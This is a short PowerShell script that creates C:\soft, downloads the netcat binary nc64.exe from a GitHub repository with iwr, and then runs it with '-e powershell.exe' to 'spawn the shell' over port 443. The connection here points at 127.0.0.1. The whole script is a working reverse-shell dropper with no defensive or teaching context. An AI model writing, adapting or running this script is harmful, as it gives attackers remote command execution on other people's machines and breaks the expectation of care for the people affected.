#   Set Directory to C:\soft
$DirectoryToCreate = 'C:\soft'

#   Check if it already exists
if (-not (Test-Path -LiteralPath $DirectoryToCreate)) {
    
    try {
        New-Item -Path $DirectoryToCreate -ItemType Directory -ErrorAction Stop | Out-Null #-Force
    }
    catch {
        Write-Error -Message "Unable to create directory '$DirectoryToCreate'. Error was: $_" -ErrorAction Stop
    }
    #   Download nc onto the directory
    iwr -uri https://github.com/IArandom/check/raw/main/nc64.exe -outfile c:\soft\nc64.exe

}
else {
    "Directory already existed"
    #   Download nc onto the directory
    iwr -uri https://github.com/IArandom/check/raw/main/nc64.exe -outfile c:\soft\nc64.exe
}

#   Spawn the shell
C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe
